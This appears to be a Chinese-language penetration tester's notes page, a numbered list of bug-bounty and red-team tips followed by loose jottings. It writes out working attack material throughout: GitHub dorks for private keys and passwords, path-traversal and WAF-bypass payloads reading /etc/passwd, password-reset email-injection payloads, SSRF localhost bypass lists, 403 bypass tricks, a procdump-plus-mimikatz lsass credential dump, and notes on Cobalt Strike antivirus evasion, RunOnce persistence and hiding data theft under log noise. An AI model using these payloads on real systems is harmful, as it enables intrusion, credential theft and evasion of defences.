<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">extension</span>:pem private<br><span class="hljs-keyword">extension</span>:ppk private<br><span class="hljs-keyword">extension</span>:<span class="hljs-keyword">sql</span> mysql dump <span class="hljs-keyword">password</span><br><span class="hljs-keyword">extension</span>:<span class="hljs-type">json</span> api.forecast.io<br><span class="hljs-keyword">extension</span>:<span class="hljs-type">json</span> mongolab.com<br><span class="hljs-keyword">extension</span>:yaml mongolab.com<br><span class="hljs-keyword">extension</span>:ica [WFClient] <span class="hljs-keyword">Password</span>=<br><span class="hljs-keyword">extension</span>:avastlic “support.avast.com”<br><span class="hljs-keyword">extension</span>:js jsforce conn.<span class="hljs-keyword">login</span><br><span class="hljs-keyword">extension</span>:<span class="hljs-type">json</span> googleusercontent client_secret<br>“target.com” send_keys<br>“target.com” <span class="hljs-keyword">password</span><br>“target.com” api_key<br>“target.com” apikey<br>“target.com” jira_password<br>“target.com” root_password<br>“target.com” access_token<br>“target.com” config<br>“target.com” client_secret<br>“target.com” <span class="hljs-keyword">user</span> auth<br>通过上述语法，可以搜索到一些敏感的私钥，一些SSH登录私钥，mysql的数据库密码，API key等等。<br>另外推荐一个脚本：https://github.com/techgaun/github-dorks<br></code></pre></td></tr></table></figure>

<p>46、SSRF常见的参数，详情请看dicts目录下的SSRF-extensions.txt文件。</p>
<p>47、通过添加<code>.json</code>后缀，泄露一些敏感信息，比如：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">一次正常请求：<br>GET <span class="hljs-regexp">/ResetPassword HTTP/</span><span class="hljs-number">1.1</span><br>&#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;victim@example.com&quot;</span>&#125;<br>响应：<br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br><br>添加.json后缀的请求：<br>GET <span class="hljs-regexp">/ResetPassword.json HTTP/</span><span class="hljs-number">1.1</span><br>&#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;victim@example.com&quot;</span>&#125;<br>响应：<br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br>&#123;<span class="hljs-string">&quot;success&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>,<span class="hljs-string">&quot;token&quot;</span>:<span class="hljs-string">&quot;596a96-cc7bf-9108c-d896f-33c44a-edc8a&quot;</span>&#125;<br>原链接：https:<span class="hljs-regexp">//</span>twitter.com<span class="hljs-regexp">/SalahHasoneh1/</span>status/<span class="hljs-number">1293918353971531776</span><br></code></pre></td></tr></table></figure>

<p>48、如果响应为401，可以试试在请求头中添加<code>X-Custom-IP-Authorization: 127.0.0.1</code></p>
<p>49、利用火绒剑，配合微信发语音的方式，可以获取该人的登录IP。</p>
<p>50、目录穿越，敏感文件读取一些Payload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">\..\WINDOWS\win.ini<br>..%<span class="hljs-number">5</span>c..%<span class="hljs-number">5</span>c..<span class="hljs-regexp">/winnt/</span>system32<span class="hljs-regexp">/cmd.exe?/</span>c+dir+c:\<br>.?\.?\.?\etc\passwd<br>..<span class="hljs-regexp">/../</span>boot.ini<br>%<span class="hljs-number">0</span>a<span class="hljs-regexp">/bin/</span>cat%<span class="hljs-number">20</span><span class="hljs-regexp">/etc/</span>passwd<br>\\&amp;apos;<span class="hljs-regexp">/bin/</span>cat%<span class="hljs-number">20</span><span class="hljs-regexp">/etc/</span>passwd\\&amp;apos;<br>..%c1%afetc%c1%afpasswd<br></code></pre></td></tr></table></figure>

<p>51、在访问admin路径面板时可以通过添加<code>%20</code>，来绕过，具体如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">target</span>.com/admin –&gt; HTTP <span class="hljs-number">302</span> (重定向到登录页面)<br><span class="hljs-attribute">target</span>.com/admin%<span class="hljs-number">20</span>/ -&gt; HTTP <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">target</span>.com/%<span class="hljs-number">20</span>admin%<span class="hljs-number">20</span>/ -&gt; HTTP <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">target</span>.com/admin%<span class="hljs-number">20</span>/page -&gt; HTTP <span class="hljs-number">200</span> OK<br></code></pre></td></tr></table></figure>

<p>52、在重置密码的地方，可以尝试添加另外一个次要的账号，比如，手机号，邮箱号等等，比如：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a、构造两个参数：<br>	email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz.tld</span>&amp;email<span class="hljs-operator">=</span>hacker<span class="hljs-title">@xyz.tld</span><br>b、使用抄送方式:<br>	email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz.tld</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>dcc:hacker<span class="hljs-title">@xyz.tld</span><br><span class="hljs-keyword">c</span>、使用分隔符：<br>	email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz.tld</span><span class="hljs-punctuation">,</span>hacker<span class="hljs-title">@xyz.tld</span><br>	email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz.tld</span><span class="hljs-variable">%20</span>hacker<span class="hljs-title">@xyz.tld</span><br>	email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz.tld</span>|hacker<span class="hljs-title">@xyz.tld</span><br>d、不使用域名：email<span class="hljs-operator">=</span>victim<br>e、不使用顶级域名：email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz</span><br>f、JSON情况：<br>&#123;<span class="hljs-string">&quot;email&quot;</span>:[<span class="hljs-string">&quot;victim@xyz.tld&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;hacker@xyz.tld&quot;</span>]&#125;<br></code></pre></td></tr></table></figure>

<p>53、如果有利用邮箱重置密码功能的情况，而且还是JSON传输的情况下，使用SQLmap跑注入，可以将<code>*</code>（星号）放在<code>@</code>之前，比如：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;“email”:”test*@xxx.com”&#125;<br>或者在*（星号）这个地方进行手注<br>原因大家可以看这里：https:<span class="hljs-regexp">//</span>tools.ietf.org<span class="hljs-regexp">/html/</span>rfc3696<span class="hljs-comment">#section-3</span><br><br>原文链接：https:<span class="hljs-regexp">//</span>www.infosecmatter.com<span class="hljs-regexp">/bug-bounty-tips-7-sep-27/</span><span class="hljs-comment">#2_bypass_email_filter_leading_to_sql_injection_json</span><br></code></pre></td></tr></table></figure>

<p>54、可以获取目标站点的<code>favicon.ico</code>图标的哈希值，然后配合shodan进行目标站点资产收集，因为每个目标站点的<code>favicon.ico</code>图标的哈希值可能是固定值，因此可以通过该方法从shodan，fofa等等去寻找更多资产。简单的用法：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#python</span> <span class="hljs-number">3</span><br>import mmh3 <br>import requests<br>import codecs<br>response = requests<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;https://www.baidu.com/favicon.ico&quot;</span>)<br>favicon = codecs<span class="hljs-selector-class">.encode</span>(response<span class="hljs-selector-class">.content</span>,<span class="hljs-string">&quot;base64&quot;</span>)<br>hash = mmh3<span class="hljs-selector-class">.hash</span>(favicon)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(hash)</span></span><br><br>或使用下面这个github项目：<br>https:<span class="hljs-comment">//github.com/devanshbatham/FavFreak</span><br><br>shodan搜索语句：http<span class="hljs-selector-class">.favicon</span><span class="hljs-selector-class">.hash</span>:哈希值<br>fofa搜索语句：icon_hash=<span class="hljs-string">&quot;-247388890&quot;</span>（但仅限于高级用户使用）<br><br>原文链接：https:<span class="hljs-comment">//www.infosecmatter.com/bug-bounty-tips-8-oct-14/#8_database_of_500_favicon_hashes_favfreak</span><br></code></pre></td></tr></table></figure>

<p>55、绕过403和401的小技巧：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">a、添加以下请求头，比如：X-Originating-IP, X-Remote-IP, X-Client-IP, X-Forwarded-For等等；有可能会有一些白名单IP地址可以访问这些敏感数据。<br><br>b、如果使用GET方法访问某些路径，返回<span class="hljs-number">403</span>，可以先访问允许访问的路径，然后在请求头中，添加下面的头：<br>X-Original-URL: /admin<br>X-Override-URL: /admin<br>X-Rewrite-URL: /admin<br><br>c、可以使用下面这些Payload试试<br><span class="hljs-regexp">/accessible/</span>..;/admin<br><span class="hljs-regexp">/.;/</span>admin<br><span class="hljs-regexp">/admin;/</span><br><span class="hljs-regexp">/admin/</span>~<br><span class="hljs-regexp">/./</span>admin<span class="hljs-regexp">/./</span><br>/admin?param<br><span class="hljs-regexp">/%2e/</span>admin<br>/admin<span class="hljs-comment">#</span><br><br>原文链接：https:<span class="hljs-regexp">//</span>www.infosecmatter.com<span class="hljs-regexp">/bug-bounty-tips-8-oct-14/</span><span class="hljs-comment">#11_tips_on_bypassing_403_and_401_errors</span><br></code></pre></td></tr></table></figure>

<p>56、如果访问<code>/.git</code>目录返回403，别忘了进一步访问下面的目录，比如：<code>/.git/config</code></p>
<p>57、使用通配符绕过WAF，如果WAF拦截了RCE，LFI的payload，我们可以尝试使用通配符来绕过，比如：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/cat /</span>etc<span class="hljs-regexp">/passwd ==  /</span>???<span class="hljs-regexp">/???/</span>c?t<span class="hljs-variable">$IFS</span><span class="hljs-regexp">/?t?/</span>p?s?wd<br>? = 任意的单个字符<br>* = 任意字符串，也包含置空的字符串<br>通配符在常见的系统中都适用，另外我们可以使用<span class="hljs-variable">$IFS</span>特殊变量取代空白<br><span class="hljs-variable">$IFS</span> = 内部字段分隔符 = [space], [tab] 或者 [newline]<br><br>cat <span class="hljs-regexp">/etc$u/</span>p*s*wd<span class="hljs-variable">$u</span><br><br>小例子，执行<span class="hljs-regexp">/bin/</span>cat <span class="hljs-regexp">/etc/</span>passwd的写法：<br><span class="hljs-regexp">/*/</span>?at<span class="hljs-variable">$IFS</span><span class="hljs-regexp">/???/</span>???swd<br><span class="hljs-regexp">/****/</span>?at<span class="hljs-variable">$IFS</span><span class="hljs-regexp">/???/</span>*swd<br><span class="hljs-regexp">/****/</span>?at<span class="hljs-variable">$IFS</span><span class="hljs-regexp">/???/</span>*******swd<br><br>原文地址：https:<span class="hljs-regexp">//</span>www.infosecmatter.com<span class="hljs-regexp">/bug-bounty-tips-9-nov-16/</span><span class="hljs-comment">#8_waf_bypass_using_globbing</span><br></code></pre></td></tr></table></figure>

<p>58、绕过403的一个BurpSuit插件，地址：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/sting8k/</span>BurpSuite_403Bypasser<br></code></pre></td></tr></table></figure>

<p>59、SSRF bypass列表，基于localhost（127.0.0.1），如下：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0000</span>::<span class="hljs-number">1</span>:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span>[::]:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/<br>http:<span class="hljs-regexp">//</span>whitelisted@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7f000001/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">017700000001</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0177.00</span>.<span class="hljs-number">00.01</span><br>http:<span class="hljs-regexp">//</span>⑯⑨。②⑤④。⑯⑨｡②⑤④/<br>http:<span class="hljs-regexp">//</span>⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span>⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span>②⑧⑤②⓪③⑨①⑥⑥:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span>④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span>⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>xd8.<span class="hljs-number">0</span>x3a.<span class="hljs-number">0</span>xd6.<span class="hljs-number">0</span>xe3<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>xd83ad6e3<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>xd8.<span class="hljs-number">0</span>x3ad6e3<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>xd8.<span class="hljs-number">0</span>x3a.<span class="hljs-number">0</span>xd6e3<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0330.072</span>.<span class="hljs-number">0326.0343</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">000330.0000072</span>.<span class="hljs-number">0000326.00000343</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">033016553343</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">3627734755</span><br>http:<span class="hljs-regexp">//</span>%<span class="hljs-number">32</span>%<span class="hljs-number">31</span>%<span class="hljs-number">36</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">35</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">32</span>%<span class="hljs-number">31</span>%<span class="hljs-number">34</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">32</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">216.0</span>x3a.<span class="hljs-number">00000000326.0</span>xe3<br><br>原文链接：https:<span class="hljs-regexp">//</span>www.infosecmatter.com<span class="hljs-regexp">/bug-bounty-tips-10-dec-24/</span><span class="hljs-comment">#13_ssrf_bypass_list_for_localhost_127001</span><br></code></pre></td></tr></table></figure>



<p>60、对于Apache shiro的CVE-2020-17523的未授权访问，是由于Spring+shiro结合造成的漏洞，可在路径后面添加<code>%20</code>，尝试访问该路径内容，造成未授权访问操作。</p>
<p>61、在一些验证码登录，找回密码等地方需要输入手机号，邮箱号的话，尝试配合SQL注入联合查询方式，填写可控手机号，实际情况实际分析。</p>
<p>62、密码爆破不如意，试试”密码喷洒攻击（Password Spray Attack）”法，多来收集用户名。</p>
<p>63、Exchange的下的目录以及功能介绍：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/autoDiscover/</span>	自Exchange Server <span class="hljs-number">2007</span>开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。<br><span class="hljs-regexp">/ecp/</span>“Exchange Control Panel”		Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台<br><span class="hljs-regexp">/eWS/</span>“Exchange Web Services”		Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互<br><span class="hljs-regexp">/mapi/</span>		Outlook连接Exchange的默认方式，在<span class="hljs-number">2013</span>和<span class="hljs-number">2013</span>之后开始使用，<span class="hljs-number">2010</span> sp2同样支持<br><span class="hljs-regexp">/microsoft-Server-ActiveSync/</span>		用于移动应用程序访问电子邮件<br><span class="hljs-regexp">/OAB/</span>“Offline Address Book”		用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担<br><span class="hljs-regexp">/owa/</span>“Outlook Web APP”		Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等<br><span class="hljs-regexp">/powerShell/</span>	用于服务器管理的Exchange管理控制台<br><span class="hljs-regexp">/Rpc/</span>	早期的Outlook还使用称为Outlook Anywhere的RPC交互<br></code></pre></td></tr></table></figure>

<p>64、针对于Exchange的账号格式，可以尝试：<code>domain\username、domian.com\username、username</code></p>
<p>65、一个验证域名是否使用了Exchange的脚本：<code>https://github.com/vysecurity/checkO365</code></p>
<p>66、使用云函数的多出口特性，可以将其作为代理池来用。思路大概为：</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">流程：浏览器请求数据 -&gt; 编写代理 -&gt; 通过代理将数据传给api网关 -&gt; api网关触发云函数并将参数作为event传入进云函数内 (然后反向流程将数据返回到浏览器中)<br>所以我们大致编写代码步骤为：<br><span class="hljs-number">1</span>、编写云函数，使用api网关做触发器，云函数主要处理api网关传来的数据，再将访问返回的数据包传会给api网关<br><span class="hljs-number">2</span>、编写代理代码，主要接收浏览器传来的数据，并将数据整理传给api网关，然后回到第一步。<br>注：这是一个思路，具体实现不局限于此，各位大佬各显神通吧~<br></code></pre></td></tr></table></figure>

<p>每5000字一个tips结尾</p>
<p>小tips2</p>
<p>‘反引号可以在xxs中绕过，不可以在sql中，但是好像在网站中可以</p>
<p>学校的英语听远程定时关机重启开机，开关显示屏</p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">linux关闭显示器命令：xset dpms <span class="hljs-literal">force</span> <span class="hljs-literal">off</span><br>win:可以命令修改休眠时间，命令定时开启机器<br></code></pre></td></tr></table></figure>

<ol>
<li><strong>第一点</strong>：写http隧道马的时候，用哥斯拉直接编辑新建一个隧道马，但是连接的时候报错，可能是哥斯拉出现了数据断流，导致写进去的文件缺东西了，后来直接把隧道马传上去就不报错了。</li>
<li><strong>第二点</strong>：网上的例子大多数都用pystinger反代cs服务端来处理这种不出网上线cs的情况，但是可能因为目标网络环境的不一样导致各种玄学报错，所以Pystinger的局限性还是很大的，而且Pystinger客户端还不免杀。</li>
<li><strong>第三点</strong>：正向shell免杀，不多说的，cs的无阶段木马都是这样，无法通过混淆加载器的方法免杀。</li>
<li><strong>第四点</strong>：正向shell的提权，cs插件提权只能反弹一个反射型的shell，无法反弹正向shell。</li>
<li><strong>第五点</strong>：有趣的是，无阶段木马是能生成powershell脚本的，而powershell脚本是很好混淆免杀的，但是目标是server2016，默认开启AMSI，混淆免杀在它面前形同虚设。（要是目标是2012、2008系统就可以通过powershell正向bind上线）</li>
</ol>
<p>alt+鼠标拖动可以进行按列选取</p>
<p>sqlmap—–shell</p>
<p>-priv和-osshell的使用  可以直接上传转换为自己的或者sqlmap自带的aspx码。php码等，还可以利用上传的码转发给msf。cs，或者转换新码加固。转到msf，cs后可以进行进程转发。注入进程等</p>
<p>拿到spn票据然后破解可以得到域的密码（kali有相关的工具）</p>
<p>ls -l &#x2F;etc&#x2F;passwd的返回种 -rw-r- -r- -表示&#x2F;etc&#x2F;passwd文件不允许除root以外的用户进行写入，但passwd命令可以（通过setuid机制）临时以root权限来运行</p>
<p>-r-s- -x- -x中的 r-s  这里的s表示该程序以启用setuid</p>
<p>-rws- -x- -x 中的rws表示已经启用了setuid</p>
<p>s 192.168.8.6       p 4000           i 10.0.92.92</p>
<p> G 10.0.92.1  M 255.255.252.0</p>
<p>s应该是服务端，p是端口，i是ipv4，g是网关，m是子网掩码</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">声东击西，其实已经沦陷了别人在偷数据你们却被大量无用日志一叶障目。：偷数据的同时增加大量各种日志<br><br>，你完全可以用任何编码、加密算法，来发送你的 payload, 前提是你的 webshell 里面有对应的解码、解密算法。比如说你可以在 <span class="hljs-keyword">base64 </span>数据前面随机加几个字符，导致 <span class="hljs-keyword">base64 </span>无法直接解码，或者，你还可以像下面这样，直接用 zlib 把 payload 压缩之后再进行 <span class="hljs-keyword">base64 </span>编码发送：<br><br>当然了，针对 WAF最爱的 eval、<span class="hljs-keyword">base64_decode </span>等关键字，会强制进行拆分，美中不足的是，目前 nodejs 对畸形chunk支持还不是很好，无法发送畸形的 chunk 包。当然这种方式也是利用的 WAF 对该类型的报文解析不完善。有个思路是，你可以自己写一个 Proxy 来专门把普通的包转成畸形包。<br><br>图片<br><br>聪明的你是不是已经想到了，<span class="hljs-keyword">burp </span>有个插件 chunked-converter 就可以完成这件事，不过你需要自己改改他的代码。<br><br>这种传输方式，要想检测到，WAF也得相应的支持对 chunk 分块传输的解析，在接到数据包的时候需要把之前的报文能关联起来进行分析。还是那句话，考虑性能<br><br>很多免杀都是将<span class="hljs-keyword">shellcode加载器写到一个文件中去，再使用另外一个脚本调用，多层调用，多层加密，加壳</span><br><span class="hljs-keyword"></span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">最近看到一个文章《Rust 是可能编程的未来》，现在看到了php利用web java利用反序列化，python写poc，nim，go啥的都可以写攻击脚本和攻击工具，<span class="hljs-keyword">c</span>/<span class="hljs-keyword">c</span>++语言最底层编译，二进制做逆向。再加上现在的rust有一种未来会成为主流开发人员利用工具，且可以在多种领域使用。将来网站也可能是用rust作为一种开发手段。 而这种工具随着历史的推移也会不断进步迭代。渗透人改如何跟进甚至超越时代脚步。用自身的态势感知去掌握先进工具的利用，编写红队工具等方法来充分利用这些工具。渗透人该怎么去适应这种趋势呢?这是一个值得思考的问题。<br></code></pre></td></tr></table></figure>

<p>能联网就能反向连接</p>
<p>pyinstxtractor.py居然可以破解<code>pyinstaller --key -F </code>参数加密打包的文件。</p>
<p>而且生成的_key文件里面有密码</p>
<p>,CS生成的ShellCode只是一段下载者。主要功能为下载becon.dll，然后内存加载，我们所用的相关功能都在becon里。ShellCode可能采用汇编或VC编写后转成机器码提取关键机器码，优势在于体积小。体积小就可以直接结合漏洞使用</p>
<p>**<br>指令:** 命令cpu干什么,是由操作码字段和地址码字段(操作数字段)组成</p>
<p><strong>操作码(Opcode):</strong> 就是执行某种操作的命令代码</p>
<p><strong>BYTECODE(字节码）：</strong>与机器代码相同,除了它主要由基于软件的解释器(如Java或CLR)使用**<br>**</p>
<p><strong>程序集：</strong>有两个“程序集” – 一个汇编程序是一系列的助记符和操作数,它们被馈送到“汇编程序”,“<strong>汇编程序</strong>”将助记符和操作数“汇编成可执行的机器代码”.可选地,“链接器”链接组件并生成可执行文件.</p>
<p><strong>CLR语言：</strong>(.NET语言)中的第二个“程序集”是一系列CLR代码,其中注入了元数据信息,可执行代码库,但不能直接执行.</p>
<p><strong>ShellCode</strong>是子弹，用枪发射(好比处理器执行); 无论你用的是哪种子弹(ShellCode)，都是用枪来射(处理器执行)。</p>
<p><strong>Payload:</strong> K8的理解是弹药，弹药可装填到弹壳里用，也可直接点然，也可圈起来当成炮仗点燃，但是弹药不能直接被枪发射。</p>
<p>推荐挖挖培训机构（不少都是上市公司，而且对安全这一块相对不怎么重视）</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">利用procdump+Mimikatz来读取windows明文密码。<br><br>由于prodump.exe是微软系统自带，有微软的签名证书，所以杀软不会拦截。<br>\<span class="hljs-meta"># lsass.dmp保存至当前目录</span><br>procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br>\<span class="hljs-meta"># 脱回本地，猕猴桃（mimikatz）读取明文密码</span><br><span class="hljs-symbol">sekurlsa:</span>:minidump lsass.dmp<br><span class="hljs-symbol">sekurlsa:</span>:logonpasswords<br></code></pre></td></tr></table></figure>

<p>断网状态下登录之前登录过的svip账户再连接上网络就能继续使用</p>
<p>win dir等于linux ls</p>
<p>socks5不支持icmp协议   不能ping</p>
<p>shell进入后 权限不够高，可以使用看现有语言环境（php python go c等），根据环境代码进行各种半交互提权</p>
<p>学习游戏打球！！！ 2021&#x2F;11&#x2F;26 15:25:39<br>PHP 上传，⽆法上传 php、解析、后台没有办法拿到，只有⼀处点可以上传。通过 Windows 特性 shell.php::$DAT，是⼀个项⽬管理系统</p>
<p>这是啥</p>
<p>0、如何利⽤这个防注⼊系统拿 shell？<br>在 URL ⾥⾯直接提交⼀句话，这样⽹站就把你的⼀句话也记录进数据库⽂件了 这个时候可以尝试寻找⽹站的配置⽂件</p>
<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce这个路径，也是能够添加指向程序的路径来实现自启动的，这里跟之前有一点不同的就是这个路径下的key在重启后执行一次就会自动删除，而Run目录下的注册表如果不去管他他会一直存在</p>
<p>copy ab那个是脚本图片码，不是二进制图片码</p>
<p>其实前面这些魔改只是做的表面功夫，真正到实战当中还是会被实力强的杀软秒杀，比如卡巴斯基等。遇到这些对手，需要让beacon和其他后渗透模块高度自定义，这里面涉及到很多方面，静态和行为都需要改造，所以单从魔改CS的客户端、服务端和控制端已经远远不够了，并且灵活度太低，参考快乐鸡哥师傅用C#重写的SharpBeacon（师傅YYDS）。另外，鉴于改造CS的客户端这么麻烦，不如在搞清楚CS的内部原理之后，在外部建设一个Stager生成服务，通过CS的配置动态生成各种语言版本的Stager，这样省去了通过Agent动态替换JAVA指令的麻烦，灵活度大大增加。（stager就是监听器的那些域名或者ip啥的（内容框里是这些，不太好解释，暂时也不太懂））</p>
